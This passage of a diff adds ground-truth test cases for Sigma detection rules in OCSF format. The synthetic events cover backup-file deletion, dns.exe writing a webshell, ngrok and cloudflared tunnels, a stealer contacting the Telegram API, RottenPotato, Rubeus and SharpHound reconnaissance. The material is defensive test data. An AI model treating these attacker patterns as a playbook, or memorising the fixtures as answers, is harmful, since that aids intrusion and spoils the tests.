+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-22-tn-1"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Excluded by filter_main_user_temp (.dll in C:\\Users\\...\\AppData\\Local\\Temp\\).",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-22-tn-2",
+        "ocsf_event_class": "File System Activity (1001)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "type_id": 1,
+                "name": "powershell.exe"
+              },
+              "uid": "proc-gt-22-tn-2"
+            }
+          },
+          "file": {
+            "path": "C:\\Users\\Public\\output.txt",
+            "type_id": 1,
+            "name": "output.txt"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-22-tn-2"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": ".txt extension is not in suspicious binary/script list.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 23,
+    "rule_id": "06125661-3814-4e03-bfa2-1e4411c60ac3",
+    "filename": "file_delete_win_delete_backup_file.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-23-tp-1",
+        "ocsf_event_class": "File System Activity (1001 - Delete)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 4,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\cmd.exe",
+                "type_id": 1,
+                "name": "cmd.exe"
+              },
+              "uid": "proc-gt-23-tp-1"
+            }
+          },
+          "file": {
+            "path": "D:\\Backups\\dc01_system.wbcat",
+            "type_id": 1,
+            "name": "dc01_system.wbcat"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-23-tp-1"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "cmd.exe deleting .wbcat backup file (activity_id=4).",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-23-tp-2",
+        "ocsf_event_class": "File System Activity (1001 - Delete)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 4,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "type_id": 1,
+                "name": "powershell.exe"
+              },
+              "uid": "proc-gt-23-tp-2"
+            }
+          },
+          "file": {
+            "path": "E:\\HyperV\\prod_db.VHD",
+            "type_id": 1,
+            "name": "prod_db.VHD"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-23-tp-2"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "powershell.exe deleting .VHD backup disk.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-23-tn-1",
+        "ocsf_event_class": "File System Activity (1001 - Create)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\cmd.exe",
+                "type_id": 1,
+                "name": "cmd.exe"
+              },
+              "uid": "proc-gt-23-tn-1"
+            }
+          },
+          "file": {
+            "path": "D:\\Backups\\dc01_system.bak",
+            "type_id": 1,
+            "name": "dc01_system.bak"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-23-tn-1"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Boundary: file creation (activity_id=1) must not match file_delete (activity_id=4).",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-23-tn-2",
+        "ocsf_event_class": "File System Activity (1001 - Delete)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 4,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Program Files\\BackupAgent\\cleaner.exe",
+                "type_id": 1,
+                "name": "cleaner.exe"
+              },
+              "uid": "proc-gt-23-tn-2"
+            }
+          },
+          "file": {
+            "path": "D:\\Backups\\old.bak",
+            "type_id": 1,
+            "name": "old.bak"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-23-tn-2"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Non-shell backup agent executable.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 24,
+    "rule_id": "9f383dc0-fdeb-4d56-acbc-9f9f4f8f20f3",
+    "filename": "file_change_win_unusual_modification_by_dns_exe.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-24-tp-1",
+        "ocsf_event_class": "File System Activity (1001)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 3,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\dns.exe",
+                "type_id": 1,
+                "name": "dns.exe"
+              },
+              "uid": "proc-gt-24-tp-1"
+            }
+          },
+          "file": {
+            "path": "C:\\Windows\\System32\\wbem\\evil.dll",
+            "type_id": 1,
+            "name": "evil.dll"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-24-tp-1"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "dns.exe modifying evil.dll (not \\dns.log).",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-24-tp-2",
+        "ocsf_event_class": "File System Activity (1001)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\dns.exe",
+                "type_id": 1,
+                "name": "dns.exe"
+              },
+              "uid": "proc-gt-24-tp-2"
+            }
+          },
+          "file": {
+            "path": "C:\\inetpub\\wwwroot\\shell.aspx",
+            "type_id": 1,
+            "name": "shell.aspx"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-24-tp-2"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "dns.exe writing webshell.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-24-tn-1",
+        "ocsf_event_class": "File System Activity (1001)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 3,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\dns.exe",
+                "type_id": 1,
+                "name": "dns.exe"
+              },
+              "uid": "proc-gt-24-tn-1"
+            }
+          },
+          "file": {
+            "path": "C:\\Windows\\System32\\dns\\dns.log",
+            "type_id": 1,
+            "name": "dns.log"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-24-tn-1"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Normal \\dns.log modification excluded by filter.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-24-tn-2",
+        "ocsf_event_class": "File System Activity (1001)",
+        "category_uid": 1,
+        "class_uid": 1001,
+        "activity_id": 3,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\svchost.exe",
+                "type_id": 1,
+                "name": "svchost.exe"
+              },
+              "uid": "proc-gt-24-tn-2"
+            }
+          },
+          "file": {
+            "path": "C:\\Windows\\Temp\\a.tmp",
+            "type_id": 1,
+            "name": "a.tmp"
+          },
+          "device": {
+            "type_id": 0,
+            "uid": "dev-gt-24-tn-2"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Actor is svchost.exe, not dns.exe.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 27,
+    "rule_id": "a66bc059-c370-472c-a0d7-f8fd1bf9d583",
+    "filename": "net_connection_win_eqnedt.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-27-tp-1",
+        "ocsf_event_class": "Network Activity (4001)",
+        "category_uid": 4,
+        "class_uid": 4001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\EQUATION\\EQNEDT32.EXE",
+                "type_id": 1,
+                "name": "EQNEDT32.EXE"
+              },
+              "uid": "proc-gt-27-tp-1"
+            }
+          },
+          "dst_endpoint": {
+            "ip": "198.51.100.33",
+            "port": 80
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Equation Editor EQNEDT32.EXE initiating network activity (CVE-2017-11882).",
+        "ocsf_version": "1.4.0",
+        "metadata_profiles": [
+          "host"
+        ]
+      },
+      {
+        "test_event_id": "gt-27-tp-2",
+        "ocsf_event_class": "Network Activity (4001)",
+        "category_uid": 4,
+        "class_uid": 4001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Users\\bob\\AppData\\Local\\Temp\\eqnedt32.exe",
+                "type_id": 1,
+                "name": "eqnedt32.exe"
+              },
+              "uid": "proc-gt-27-tp-2"
+            }
+          },
+          "dst_endpoint": {
+            "ip": "203.0.113.5",
+            "port": 443
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "eqnedt32.exe from Temp initiating outbound connection.",
+        "ocsf_version": "1.4.0",
+        "metadata_profiles": [
+          "host"
+        ]
+      },
+      {
+        "test_event_id": "gt-27-tn-1",
+        "ocsf_event_class": "Network Activity (4001)",
+        "category_uid": 4,
+        "class_uid": 4001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+                "type_id": 1,
+                "name": "WINWORD.EXE"
+              },
+              "uid": "proc-gt-27-tn-1"
+            }
+          },
+          "dst_endpoint": {
+            "ip": "203.0.113.5",
+            "port": 443
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "WINWORD.EXE is not eqnedt32.exe.",
+        "ocsf_version": "1.4.0",
+        "metadata_profiles": [
+          "host"
+        ]
+      },
+      {
+        "test_event_id": "gt-27-tn-2",
+        "ocsf_event_class": "Network Activity (4001)",
+        "category_uid": 4,
+        "class_uid": 4001,
+        "activity_id": 6,
+        "ocsf_fields": {
+          "dst_endpoint": {
+            "ip": "203.0.113.5",
+            "port": 443
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Firewall/Zeek flow without actor.process.file.path.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 28,
+    "rule_id": "e81528db-fc02-45e8-8e98-4e84aba1f10b",
+    "filename": "net_connection_win_notepad.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-28-tp-1",
+        "ocsf_event_class": "Network Activity (4001)",
+        "category_uid": 4,
+        "class_uid": 4001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\notepad.exe",
+                "type_id": 1,
+                "name": "notepad.exe"
+              },
+              "uid": "proc-gt-28-tp-1"
+            }
+          },
+          "dst_endpoint": {
+            "ip": "198.51.100.90",
+            "port": 443
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Hollowed notepad.exe connecting to port 443 (!= 9100).",
+        "ocsf_version": "1.4.0",
+        "metadata_profiles": [
+          "host"
+        ]
+      },
+      {
+        "test_event_id": "gt-28-tp-2",
+        "ocsf_event_class": "Network Activity (4001)",
+        "category_uid": 4,
+        "class_uid": 4001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\SysWOW64\\notepad.exe",
+                "type_id": 1,
+                "name": "notepad.exe"
+              },
+              "uid": "proc-gt-28-tp-2"
+            }
+          },
+          "dst_endpoint": {
+            "ip": "198.51.100.90"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Boundary: notepad.exe with missing DestinationPort is not port 9100, so must match.",
+        "ocsf_version": "1.4.0",
+        "metadata_profiles": [
+          "host"
+        ]
+      },
+      {
+        "test_event_id": "gt-28-tn-1",
+        "ocsf_event_class": "Network Activity (4001)",
+        "category_uid": 4,
+        "class_uid": 4001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\notepad.exe",
+                "type_id": 1,
+                "name": "notepad.exe"
+              },
+              "uid": "proc-gt-28-tn-1"
+            }
+          },
+          "dst_endpoint": {
+            "ip": "10.0.0.50",
+            "port": 9100
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "JetDirect printing port 9100 excluded by filter_optional_printing.",
+        "ocsf_version": "1.4.0",
+        "metadata_profiles": [
+          "host"
+        ]
+      },
+      {
+        "test_event_id": "gt-28-tn-2",
+        "ocsf_event_class": "Network Activity (4001)",
+        "category_uid": 4,
+        "class_uid": 4001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Program Files\\Notepad++\\notepad++.exe",
+                "type_id": 1,
+                "name": "notepad++.exe"
+              },
+              "uid": "proc-gt-28-tn-2"
+            }
+          },
+          "dst_endpoint": {
+            "ip": "198.51.100.90",
+            "port": 443
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "notepad++.exe does not end with '\\notepad.exe'.",
+        "ocsf_version": "1.4.0",
+        "metadata_profiles": [
+          "host"
+        ]
+      }
+    ]
+  },
+  {
+    "index": 29,
+    "rule_id": "1d08ac94-400d-4469-a82f-daee9a908849",
+    "filename": "net_connection_win_domain_ngrok_tunnel.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-29-tp-1",
+        "ocsf_event_class": "Network Activity (4001)",
+        "category_uid": 4,
+        "class_uid": 4001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "dst_endpoint": {
+            "hostname": "0.tcp.tunnel.us.ngrok.com",
+            "port": 443
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "DestinationHostname contains 'tunnel.us.ngrok.com'.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-29-tp-2",
+        "ocsf_event_class": "Network Activity (4001)",
+        "category_uid": 4,
+        "class_uid": 4001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "dst_endpoint": {
+            "hostname": "c2.tunnel.ap.ngrok.com",
+            "port": 8443
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "DestinationHostname contains 'tunnel.ap.ngrok.com'.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-29-tn-1",
+        "ocsf_event_class": "Network Activity (4001)",
+        "category_uid": 4,
+        "class_uid": 4001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "dst_endpoint": {
+            "hostname": "dashboard.ngrok.com",
+            "port": 443
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "dashboard.ngrok.com is not a regional tunnel.*.ngrok.com endpoint.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-29-tn-2",
+        "ocsf_event_class": "Network Activity (4001)",
+        "category_uid": 4,
+        "class_uid": 4001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "dst_endpoint": {
+            "ip": "3.12.45.67",
+            "port": 443
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "IP-only network event without DestinationHostname.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 30,
+    "rule_id": "c3dbbc9f-ef1d-470a-a90a-d343448d5875",
+    "filename": "net_connection_win_domain_telegram_api_non_browser_access.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-30-tp-1",
+        "ocsf_event_class": "Network Activity (4001)",
+        "category_uid": 4,
+        "class_uid": 4001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "type_id": 1,
+                "name": "powershell.exe"
+              },
+              "uid": "proc-gt-30-tp-1"
+            }
+          },
+          "dst_endpoint": {
+            "hostname": "api.telegram.org",
+            "port": 443
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "powershell.exe accessing api.telegram.org (non-browser).",
+        "ocsf_version": "1.4.0",
+        "metadata_profiles": [
+          "host"
+        ]
+      },
+      {
+        "test_event_id": "gt-30-tp-2",
+        "ocsf_event_class": "Network Activity (4001)",
+        "category_uid": 4,
+        "class_uid": 4001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Users\\Public\\stealer.exe",
+                "type_id": 1,
+                "name": "stealer.exe"
+              },
+              "uid": "proc-gt-30-tp-2"
+            }
+          },
+          "dst_endpoint": {
+            "hostname": "bot.api.telegram.org",
+            "port": 443
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Custom binary accessing api.telegram.org.",
+        "ocsf_version": "1.4.0",
+        "metadata_profiles": [
+          "host"
+        ]
+      },
+      {
+        "test_event_id": "gt-30-tn-1",
+        "ocsf_event_class": "Network Activity (4001)",
+        "category_uid": 4,
+        "class_uid": 4001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+                "type_id": 1,
+                "name": "chrome.exe"
+              },
+              "uid": "proc-gt-30-tn-1"
+            }
+          },
+          "dst_endpoint": {
+            "hostname": "api.telegram.org",
+            "port": 443
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Standard Chrome browser excluded by filter_main_chrome.",
+        "ocsf_version": "1.4.0",
+        "metadata_profiles": [
+          "host"
+        ]
+      },
+      {
+        "test_event_id": "gt-30-tn-2",
+        "ocsf_event_class": "Network Activity (4001)",
+        "category_uid": 4,
+        "class_uid": 4001,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Program Files (x86)\\Microsoft\\EdgeCore\\120.0\\msedgewebview2.exe",
+                "type_id": 1,
+                "name": "msedgewebview2.exe"
+              },
+              "uid": "proc-gt-30-tn-2"
+            }
+          },
+          "dst_endpoint": {
+            "hostname": "api.telegram.org",
+            "port": 443
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "EdgeCore WebView2 excluded by filter_main_edge_2.",
+        "ocsf_version": "1.4.0",
+        "metadata_profiles": [
+          "host"
+        ]
+      }
+    ]
+  },
+  {
+    "index": 34,
+    "rule_id": "51e33403-2a37-4d66-a574-1fda1782cc31",
+    "filename": "win_security_rdp_localhost_login.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-34-tp-1",
+        "ocsf_event_class": "Authentication (3002)",
+        "category_uid": 3,
+        "class_uid": 3002,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "unmapped": {
+            "EventID": 4624
+          },
+          "logon_type_id": 10,
+          "src_endpoint": {
+            "ip": "127.0.0.1"
+          },
+          "user": {
+            "name": "Administrator"
+          },
+          "dst_endpoint": {
+            "uid": "auth-dst-gt-34-tp-1"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "EventID 4624, LogonType 10 (RemoteInteractive), IpAddress 127.0.0.1 (tunneled RDP).",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-34-tp-2",
+        "ocsf_event_class": "Authentication (3002)",
+        "category_uid": 3,
+        "class_uid": 3002,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "unmapped": {
+            "EventID": 4624
+          },
+          "logon_type_id": 10,
+          "src_endpoint": {
+            "ip": "::1"
+          },
+          "user": {
+            "name": "svc_backup"
+          },
+          "dst_endpoint": {
+            "uid": "auth-dst-gt-34-tp-2"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "IPv6 loopback ::1 RDP logon.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-34-tn-1",
+        "ocsf_event_class": "Authentication (3002)",
+        "category_uid": 3,
+        "class_uid": 3002,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "unmapped": {
+            "EventID": 4624
+          },
+          "logon_type_id": 10,
+          "src_endpoint": {
+            "ip": "10.10.1.55"
+          },
+          "user": {
+            "name": "Administrator"
+          },
+          "dst_endpoint": {
+            "uid": "auth-dst-gt-34-tn-1"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Normal LAN IP 10.10.1.55 RDP logon.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-34-tn-2",
+        "ocsf_event_class": "Authentication (3002)",
+        "category_uid": 3,
+        "class_uid": 3002,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "unmapped": {
+            "EventID": 4624
+          },
+          "logon_type_id": 3,
+          "src_endpoint": {
+            "ip": "127.0.0.1"
+          },
+          "user": {
+            "name": "Administrator"
+          },
+          "dst_endpoint": {
+            "uid": "auth-dst-gt-34-tn-2"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "LogonType 3 (Network) instead of 10 (RemoteInteractive).",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 35,
+    "rule_id": "def8b624-e08f-4ae1-8612-1ba21190da6b",
+    "filename": "win_security_susp_logon_newcredentials.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-35-tp-1",
+        "ocsf_event_class": "Authentication (3002)",
+        "category_uid": 3,
+        "class_uid": 3002,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "unmapped": {
+            "EventID": 4624
+          },
+          "logon_type_id": 9,
+          "user": {
+            "name": "alice"
+          },
+          "dst_endpoint": {
+            "uid": "auth-dst-gt-35-tp-1"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "EventID 4624 with LogonType 9 (NewCredentials / runas /netonly).",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-35-tp-2",
+        "ocsf_event_class": "Authentication (3002)",
+        "category_uid": 3,
+        "class_uid": 3002,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "unmapped": {
+            "EventID": 4624
+          },
+          "logon_type_id": 9,
+          "src_endpoint": {
+            "ip": "127.0.0.1"
+          },
+          "user": {
+            "uid": "user-gt-35-tp-2"
+          },
+          "dst_endpoint": {
+            "uid": "auth-dst-gt-35-tp-2"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Rubeus /createnetonly LogonType 9.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-35-tn-1",
+        "ocsf_event_class": "Authentication (3002)",
+        "category_uid": 3,
+        "class_uid": 3002,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "unmapped": {
+            "EventID": 4624
+          },
+          "logon_type_id": 2,
+          "user": {
+            "name": "alice"
+          },
+          "dst_endpoint": {
+            "uid": "auth-dst-gt-35-tn-1"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Interactive LogonType 2.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-35-tn-2",
+        "ocsf_event_class": "Authentication (3002)",
+        "category_uid": 3,
+        "class_uid": 3002,
+        "activity_id": 2,
+        "ocsf_fields": {
+          "unmapped": {
+            "EventID": 4625
+          },
+          "logon_type_id": 9,
+          "user": {
+            "name": "alice"
+          },
+          "dst_endpoint": {
+            "uid": "auth-dst-gt-35-tn-2"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Failed logon EventID 4625 rather than 4624.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 36,
+    "rule_id": "16f5d8ca-44bd-47c8-acbe-6fc95a16c12f",
+    "filename": "win_security_susp_rottenpotato.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-36-tp-1",
+        "ocsf_event_class": "Authentication (3002)",
+        "category_uid": 3,
+        "class_uid": 3002,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "unmapped": {
+            "EventID": 4624
+          },
+          "logon_type_id": 3,
+          "user": {
+            "name": "ANONYMOUS LOGON"
+          },
+          "src_endpoint": {
+            "hostname": "-",
+            "ip": "127.0.0.1"
+          },
+          "dst_endpoint": {
+            "uid": "auth-dst-gt-36-tp-1"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "RottenPotato local NTLM reflection signature (4624, Type 3, ANONYMOUS LOGON, '-', 127.0.0.1).",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-36-tp-2",
+        "ocsf_event_class": "Authentication (3002)",
+        "category_uid": 3,
+        "class_uid": 3002,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "unmapped": {
+            "EventID": 4624
+          },
+          "logon_type_id": 3,
+          "user": {
+            "name": "anonymous logon"
+          },
+          "src_endpoint": {
+            "hostname": "-",
+            "ip": "::1"
+          },
+          "dst_endpoint": {
+            "uid": "auth-dst-gt-36-tp-2"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "IPv6 loopback ::1 RottenPotato variant.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-36-tn-1",
+        "ocsf_event_class": "Authentication (3002)",
+        "category_uid": 3,
+        "class_uid": 3002,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "unmapped": {
+            "EventID": 4624
+          },
+          "logon_type_id": 3,
+          "user": {
+            "name": "ANONYMOUS LOGON"
+          },
+          "src_endpoint": {
+            "hostname": "WS01",
+            "ip": "127.0.0.1"
+          },
+          "dst_endpoint": {
+            "uid": "auth-dst-gt-36-tn-1"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "WorkstationName is 'WS01' rather than '-'.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-36-tn-2",
+        "ocsf_event_class": "Authentication (3002)",
+        "category_uid": 3,
+        "class_uid": 3002,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "unmapped": {
+            "EventID": 4624
+          },
+          "logon_type_id": 3,
+          "user": {
+            "name": "CORP_ADMIN"
+          },
+          "src_endpoint": {
+            "hostname": "-",
+            "ip": "127.0.0.1"
+          },
+          "dst_endpoint": {
+            "uid": "auth-dst-gt-36-tn-2"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Authenticated named user rather than ANONYMOUS LOGON.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 40,
+    "rule_id": "a1d9eec5-33b2-4177-8d24-27fe754d0812",
+    "filename": "dns_query_win_cloudflared_communication.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-40-tp-1",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "region1.v2.argotunnel.com"
+          },
+          "src_endpoint": {
+            "uid": "ep-gt-40-tp-1"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Ends with '.v2.argotunnel.com'.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-40-tp-2",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "quick-demo.trycloudflare.com"
+          },
+          "src_endpoint": {
+            "uid": "ep-gt-40-tp-2"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Ends with 'trycloudflare.com'.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-40-tn-1",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "www.cloudflare.com"
+          },
+          "src_endpoint": {
+            "uid": "ep-gt-40-tn-1"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Main cloudflare.com website is not an argotunnel/trycloudflare tunnel.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-40-tn-2",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "trycloudflare.com.phish.test"
+          },
+          "src_endpoint": {
+            "uid": "ep-gt-40-tn-2"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Does not end with cloudflared tunnel domain.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 41,
+    "rule_id": "a21bcd7e-38ec-49ad-b69a-9ea17e69509e",
+    "filename": "dns_query_win_dns_server_discovery_via_ldap_query.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-41-tp-1",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "_ldap._tcp.dc._msdcs.corp.local"
+          },
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Users\\Public\\SharpHound.exe",
+                "type_id": 1,
+                "name": "SharpHound.exe"
+              },
+              "uid": "proc-gt-41-tp-1"
+            }
+          },
+          "src_endpoint": {
+            "uid": "ep-gt-41-tp-1"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "_ldap. SRV query from SharpHound.exe in C:\\Users\\Public\\.",
+        "ocsf_version": "1.4.0",
+        "metadata_profiles": [
+          "host"
+        ]
+      },
+      {
+        "test_event_id": "gt-41-tp-2",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "_ldap._tcp.Default-First-Site-Name._sites.corp.local"
+          },
+          "actor": {
+            "process": {
+              "file": {
+                "path": "D:\\Temp\\adrecon.exe",
+                "type_id": 1,
+                "name": "adrecon.exe"
+              },
+              "uid": "proc-gt-41-tp-2"
+            }
+          },
+          "src_endpoint": {
+            "uid": "ep-gt-41-tp-2"
+          }
+        },
